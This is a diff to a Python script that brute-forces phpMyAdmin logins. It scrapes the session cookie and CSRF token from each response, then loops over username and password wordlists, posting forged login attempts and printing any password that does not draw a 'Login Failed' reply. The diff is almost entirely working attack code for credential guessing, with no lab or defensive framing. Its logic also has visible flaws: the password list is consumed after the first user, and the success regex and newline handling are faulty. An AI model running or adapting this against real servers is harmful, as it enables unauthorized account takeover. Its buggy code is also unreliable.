@@ -77,22 +77,46 @@ def forge_post(url, token, resp_cookie, username, password):
 
     return resp
 
-def analyze_resp(resp):
+def analyze_resp(resp, password):
+
+    matched_password = False
     
     #extract response cookie 
 
-    for cookie in resp.cookies:
-        print(cookie)
+    set_session_pattern = re.compile(r'set_session" value="([a-f0-9]+)"')
+    
+    session_match = set_session_pattern.search(resp.text)
 
-    #print(resp.text)
+    if session_match:
+        cookie = session_match.group(1)
+        print("set_session cookie value:", cookie)
+    else:
+        print("set_session cookie not found.")
+        return 0
 
-    #resp_cookie = re.search(r"phpMyAdmin=\K\w+(?=;)", resp.cookies)
+    token_pattern = re.compile(r'token" value="([a-f0-9]+)"')
+    
+    match = token_pattern.search(resp.text)
 
-    #resp_cookie = 1
+    if match:
+        token = match.group(1)
+        print("Token value:", token)
+    else:
+        print("Token not found.")
+        return 0
 
-    #return (resp_cookie, match)
+    # search for positive password feedback
 
-    return 0
+    pattern_not_failed = re.compile(r'^((?!Login Failed).)*$')
+    log_match = pattern_not_failed.search(resp.text)
+
+    if log_match:
+        print("Text does not contain 'Login Failed'.")
+        print(password)
+        matched_password = True
+
+    return (cookie, token, matched_password)
+
 
 def do_get (URL):
 
@@ -104,15 +128,31 @@ def do_get (URL):
 
 def main():
 
+    found = False
     #initialize bruteforce session by sending virgin GET request
     resp = do_get(URL)
 
     #resp = forge_post(URL, token, cookie, "root", "toor")
 
-    analyze_resp(resp)
+    (cookie, token, matched_password) = analyze_resp(resp,"Initializing")
     
     #(cookie,token) = analyze_resp(resp)
 
+    with open(USER_FILE,"r") as u:
+
+        with open(PASS_FILE,"r") as f:
+
+            for user in u.readlines():
+                for password in f.readlines():
+                    #print(line)
+                    # send a password attempt with post request
+                    resp = forge_post(URL, token, cookie, user, password)
+                    (cookie, token, matched_password) = analyze_resp(resp, password)
+                    if matched_password:
+                        found = True
+                        break
+                if found:
+                    break
 
 
     return 0
